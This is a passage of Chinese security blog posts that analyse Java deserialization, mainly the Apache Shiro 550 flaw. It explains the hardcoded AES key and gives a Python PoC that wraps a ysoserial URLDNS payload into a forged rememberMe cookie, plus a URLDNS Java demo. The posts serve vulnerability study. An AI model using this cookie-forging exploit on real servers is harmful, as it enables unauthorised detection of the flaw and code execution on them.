*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 put 时不发起 dns 解析</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlDNSTest</span>.SilentURLStreamHandler();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://atysqv.dnslog.cn&quot;</span>, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射将put之后 hashCode 的 值重新赋值为 -1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        f.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过序列化，发现确实没有在payload生成阶段发起dns解析。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084603.png" alt="image-20210604082455201"></p>
<p>接下来我们通过读取<code>out.bin</code> 文件将其反序列化来模拟漏洞点，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">       ois.readObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084609.png" alt="image-20210604082654765">请求成功。</p>
<p>最后回顾一下整个流程:			</p>
<pre><code>1. 将URL对象作为key放入hashMap中，将其序列化发送给目标机器
2. 如果目标机器存在反序列化漏洞，那么会执行`HashMap.readObject()` 将数据反序列化
3. 在反序列化期间，为了还原hashmap的内容，会调用 `hash()` 方法，而`hash()`函数会调用传入参数的 `hashCode()`方法
4. 当URL 对象的 `hashCode`属性值为 `-1` 时会调用 `handler.hashCode()`方法，而这个方法会进行一次DNS查询。
</code></pre>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.gettoby.com/p/hk4t4bb9qttz">https://www.gettoby.com/p/hk4t4bb9qttz</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞分析(一)-Shiro550</title>
    <url>/2021/05/21/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%B8%80)-Shiro550/</url>
    <content><![CDATA[<blockquote>
<p>  本菜鸡算是第一次正式分析这种玩意，很烂，都是跟着网上的分析教程走一遍，算是打响java反序列化漏洞的第一枪。我还欠了两篇文章，记着呢。</p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在它编号为550的issue 中爆出严重的Java反序列化漏洞。</p>
<p>在Apache Shiro&lt;&#x3D;1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，这就为伪造cookie提供了机会。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
<p>Shiro的“记住我”功能是设置cookie中的rememberMe值来实现。当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
<ol>
<li>检索cookie中RememberMe的值</li>
<li>Base64解码</li>
<li>使用AES解密</li>
<li>反序列化</li>
</ol>
<p>漏洞原因在于第三步，在Apache Shiro&lt;&#x3D;1.2.4版本中AES加密时采用的key是<strong>硬编码</strong>在代码中的，于是我们就可以构造RememberMe的值，然后让其反序列化执行。</p>
<blockquote>
<p>  只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
</blockquote>
<h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>首先下载源码，并切换有漏洞的版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/apache/shiro.git  </span><br><span class="line"><span class="built_in">cd</span> shiro</span><br><span class="line">git checkout shiro-root-1.2.4</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210506223552.png" alt="image-20210506223546214"></p>
<p>修改<code>samples/web/pom.xml</code>，支持jsp</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205022.png" alt="image-20210519210957110"></p>
<ol>
<li><p>Run</p>
</li>
<li><p>Edit Configurations</p>
</li>
<li><p>添加TomcatServer(Local)</p>
</li>
<li><p>Server中配置Tomcat路径</p>
</li>
<li><p>Deployment中添加Artifact</p>
</li>
<li><p>选择sample-web:war exploded</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205028.png" alt="image-20210519212838979"></p>
<blockquote>
<p>  这里若要使用burpsuite，注意端口不要和bp冲突</p>
</blockquote>
</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205034.png" alt="image-20210519210846672"></p>
<p>然后运行即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205039.png" alt="image-20210519212950043"></p>
<h2 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h2><p>根据 <a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a> 描述</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205046.png" alt="image-20210519211422639"></p>
<p>这是几个重要的点:</p>
<ul>
<li>检索<code>RememberMe</code> cookie的值</li>
<li>Base64解码</li>
<li>使用AES解密</li>
<li>使用Java序列化（<code>ObjectInputStream</code>）反序列化。</li>
</ul>
<h3 id="3-1-rememberMe-cookie"><a href="#3-1-rememberMe-cookie" class="headerlink" title="3.1 rememberMe cookie"></a>3.1 rememberMe cookie</h3><p>先来瞧瞧这个cookie，进入登录界面，在登录时，勾选<code>Remember Me</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205052.png" alt="image-20210519213228149"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rememberMe=+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU</span><br></pre></td></tr></table></figure>

<p>使用<code>Base64</code>解码存储为二进制文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author : yhy</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">rememberMe = <span class="string">&#x27;+3nYB8HVKgNT9ewnrYDz2kMZA2QhOJucwaUx76IB0ya4ZesDlsfmreeeZ1ngxazK7jEsPKIWkxfdBfVEhPI+fiKqfyV0+tH4U+RcWPwITXq4NgY415Edvbb7Wmx6j+KW6C7RaEMf6A9ib8KvOwZizhXUw8d87EyaXpPd6RzJghoOJJoq7hP4gxLv1L5i9u1EZriLjUcnfaufS5R3jevlVgpYAMhuDWK8m9/lJZvK/IWm4/5RAmiDQEirwB8r57x/tZ71fs7baFXOZVueN/V7dJv8ySJP+ozQ/cy3bcx6+ZgF/MJvn4e5nLtM01u8jgg1rTk7fW+0jt61Znq1mq0BNnzAraTZg+0pSU36+aCiolYLh82BX/jJHweu9COVUyONKrXBcm8mPOz0vO8Kjq581OmACdiQgC1kI6qHrr+GloO0xlk4MJZiVzzYm5YdGkgDOPNGO2Lfh4U5hmprEzlf+5/7zwKILsMtOVrqZG5AXXW1XKTch62gq7jAWAXBmyIU&#x27;</span></span><br><span class="line"></span><br><span class="line">rememberMe_64 = base64.b64decode(rememberMe)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;rememberMe&quot;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f.write(rememberMe_64)</span><br></pre></td></tr></table></figure>

<p>内容如下:<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205104.png" alt="image-20210519214639370"></p>
<p>上述内容中并没有在<a href="">初探Java反序列化漏洞（一）</a>中提到过的序列化的数据流以魔术数字和版本号<code>AC ED 00 05</code> 等字样。这是因为上述关键步骤中提到了<code>AES解密</code>，所以需要去跟一下源码。</p>
<h3 id="3-2-Shiro-500-中的-AES-解密"><a href="#3-2-Shiro-500-中的-AES-解密" class="headerlink" title="3.2 Shiro 500 中的 AES 解密"></a>3.2 Shiro 500 中的 AES 解密</h3><p>在IDEA中<code>ctrl+shift+f</code> 全局搜索<code>AES</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205115.png" alt="image-20210520201956272"></p>
<p>在<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>中找到了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><strong>Base64.decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”)</strong> 就是我们要找的硬编码密钥，因为AES是对称加密，即加密密钥也同样是解密密钥。</p>
<p>然后看看shiro是怎么处理解密的，向下看，找到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Decrypts the byte array using the configured &#123;<span class="doctag">@link</span> #getCipherService() cipherService&#125;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> encrypted the encrypted byte array to decrypt</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the decrypted byte array returned by the configured &#123;<span class="doctag">@link</span> #getCipherService () cipher&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数名<code>decrypt</code>，显而易见，是处理解密的，<code>cipherService</code>是一个接口,调用了其中的<code>decrypt</code>解密方法，需要两个变量<code>encrypted</code>(被加密的数组) 和 <code>getDecryptionCipherKey()</code>(获取解密秘钥)，前面说了AES是对称加密，即加密密钥也同样是解密密钥。而且从程序中也能看到，确实是同一个，通过在该类中查找<code>setDecryptionCipherKey()</code>方法，可以看到<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205124.png" alt="image-20210520204036228"></p>
<p>再搜索<code>setCipherKey</code>，可以看到构造方法中传入了<code>DEFAULT_CIPHER_KEY_BYTES</code>也就是<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code>的值<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205131.png" alt="image-20210520204113812"></p>
<p>然后再看一下<code>CipherService</code>这个接口的<code>decrypt</code>的具体实现，<code>ctrl+右键</code>跟进去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520205138.png" alt="image-20210520205000830"></p>
<p>这只是个接口，全局搜索<code>implements CipherService</code> 发现<code>src/main/java/org/apache/shiro/crypto/JcaCipherService.java</code>实现了<code>CipherService</code>接口，进去看看<code>decrypt</code>方法</p>
<p>为了方便，我们在这里下个断点，发现是<code>CBC</code>模式，并且 <code>iv</code>偏移量的值为 **byte[] iv &#x3D; new byte[16] ** <img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520215312.png" alt="image-20210520215309770"></p>
<p>利用下面的脚本解密之前<code>base64解码</code>后生成的<code>rememberMe</code>文件得到<code>decrypt.bin</code>文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pip install pycrypto</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_rememberme_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fpr:</span><br><span class="line">        key  =  <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">        mode =  AES.MODE_CBC</span><br><span class="line">        IV   = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)</span><br><span class="line">        remember_bin = encryptor.decrypt(fpr.read())</span><br><span class="line">    <span class="keyword">return</span> remember_bin</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt.bin&quot;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">        fpw.write(decode_rememberme_file(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210520221430.png" alt="image-20210520221418998"></p>
<p>这是 Java 序列化的标志，说明解密成功</p>
<h3 id="3-3-反序列化"><a href="#3-3-反序列化" class="headerlink" title="3.3 反序列化"></a>3.3 反序列化</h3><p>看看解密之后的操作，回到<code>src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java</code>类中，看看，从哪里调用了<code>decrypt</code>函数，<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074327.png" alt="image-20210521073527745"></p>
<p>在<code>convertBytesToPrincipals</code>这里解密之后，执行了反序列化<code>deserialize</code>，进去瞅瞅<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074332.png" alt="image-20210521074103621"></p>
<p>通过获取<code>getSerializer()</code>来调用反序列化，再看看<code>SetSerializer</code><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074338.png" alt="image-20210521074230279"></p>
<p><strong>src&#x2F;main&#x2F;java&#x2F;org&#x2F;apache&#x2F;shiro&#x2F;io&#x2F;DefaultSerializer.java</strong><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521074341.png" alt="image-20210521074304324"></p>
<p>这里使用的是默认反序列化类，没有任何检验，<code>readobject()</code>触发反序列化!<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521092011.png" alt="image-20210521074629505"></p>
<h2 id="0x04-漏洞探测"><a href="#0x04-漏洞探测" class="headerlink" title="0x04 漏洞探测"></a>0x04 漏洞探测</h2><p>现在我们知道了<strong>shiro550</strong>在获取到<strong>rememberMe cookie</strong>的值后，通过硬编码的KEY **kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;<strong>进行AES解密，解密完成之后直接调用默认的反序列化的</strong>readobject()**方法，没有经过任何的校验。</p>
<p>具体的 <strong>Payload</strong> 也就呼之欲出了，将<code>payload</code>通过AES加密伪造<strong>rememberMe cookie</strong>,我们通过刚才的解密流程知道<strong>shiro550</strong>采用的<strong>CBC</strong>模式、**byte[] iv &#x3D; new byte[16]**， 通过脚本伪造，利用<code>ysoserial.jar</code> 神器生成<code>URLDNS</code>探测的payload进行探测(shiro550自带来commons-collections3.2.1，关于commons-collections的相关漏洞，后续分析)<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521092006.png" alt="image-20210521091543563"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2020/10/16 17:36</span></span><br><span class="line"><span class="comment"># @Author  : nice0e3</span></span><br><span class="line"><span class="comment"># @FileName: poc.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://www.cnblogs.com/nice0e3/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rememberme</span>(<span class="params">command</span>):</span><br><span class="line">    popen = subprocess.Popen([<span class="string">&#x27;java&#x27;</span>, <span class="string">&#x27;-jar&#x27;</span>, <span class="string">&#x27;ysoserial.jar&#x27;</span>, <span class="string">&#x27;URLDNS&#x27;</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 替换dnslog </span></span><br><span class="line">    payload = rememberme(<span class="string">&#x27;http://5fzd8f.dnslog.cn&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.cookie&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fpw:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode()))</span><br><span class="line">        res = <span class="string">&quot;rememberMe=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.decode())</span><br><span class="line">        fpw.write(res)</span><br></pre></td></tr></table></figure>

<p>运行生成</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">rememberMe=Y3M07legS/64hNfAmb+zfY1Ch/sXxGbop7rMR3YgWuFwTmdZEGj1q0oaHMowhUpUopo4XNjBkIDbn+w4Zhq0QO+9GXX4+hZA67NiM5U6sXcxtxLZCdlRB4JlrT8JrtTs+OyejDVh2HXLgI29lmMSDVoVW5OV3EHISFbFS+MmQv6JGqt60OZHxw6y1uhwYcWiRZ2kqGwDbNE/Xj+vNA1/5CdvnElY3jVvo8YJ8Suy8zznVuMlR2OsjksaHel8dXoUSXRiTAsMnn0SJIqKm7KI98YqTQaSn4F7VnEqaaNyciQwgOoOV/MphOWjVcTWsEDgdUjT5WgI+pJSZpX9JIo1XT75SPpWkiIw9Sseptaor5fsPMPNuk/lf5bWSpnwFTlTUuClsDJbOXjgvcew77i9tw==</span><br></pre></td></tr></table></figure>

<p>替换打成功<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521091957.png" alt="image-20210521084722601"></p>
<p>其实一开始是失败的，shiro550自带的包是commons-collections3.2.1,原生情况下直接用ysoserial打，是不会成功的，其他位置中直接添加了<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210521092002.png" alt="image-20210521091756305"></p>
<p>commons-collections4的包，才可以顺畅复现。至于为啥原生的3.2.1不能触发漏洞，以及可不可以触发漏洞，下篇文章再分析。</p>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p>Apache Shiro Java 反序列化漏洞分析 <a href="https://blog.knownsec.com/2016/08/apache-shiro-java/">https://blog.knownsec.com/2016/08/apache-shiro-java/</a> </p>
<p>Java安全之Shiro 550反序列化漏洞分析 <a href="https://www.anquanke.com/post/id/225442#h3-8">https://www.anquanke.com/post/id/225442#h3-8</a> </p>
<p>ysoserial <a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞分析(二)-Shiro550</title>
    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
    <content><![CDATA[<blockquote>
<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
</blockquote>
<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
<blockquote>
<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
</blockquote>
<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
<blockquote>
<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
</blockquote>
<p>别人在环境中引入了<code>commons-collections4.0</code>，使得ysoserial的<code>CommonsCollections2</code>利用链可以成功利用。这是因为<code>CommonsCollections2</code>用的是非数组形式的利用链，在该利用链上没有出现数组类型的对象，这使得在shiro的环境下，可以正确执行命令。（后续学习这条链）</p>
<h2 id="0x01-构造新的利用链"><a href="#0x01-构造新的利用链" class="headerlink" title="0x01 构造新的利用链"></a>0x01 构造新的利用链</h2><p>我不会。。。 看半天还是没看懂，前置知识缺的有点多，直接放链接吧</p>
<p><a href="https://www.anquanke.com/post/id/192619#h2-3">https://www.anquanke.com/post/id/192619#h2-3</a> </p>
<p>总结就是利用链中的<code>ChainedTransformer</code>这个类的利用是无法成功的，因为它的类属性<code>iTransformers</code>是数组类型的<code>Transformers</code>，最终通过使用<code>TemplatesImpl.newTransformer</code>函数来动态<code>loadClass</code>构造好的evil class bytes</p>
<p>通过大佬改造的<a href="https://github.com/wh1t3p1g/ysoserial">https://github.com/wh1t3p1g/ysoserial</a> CommonsCollections10 利用链打一下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210529212125.png" alt="image-20210527084745187"></p>
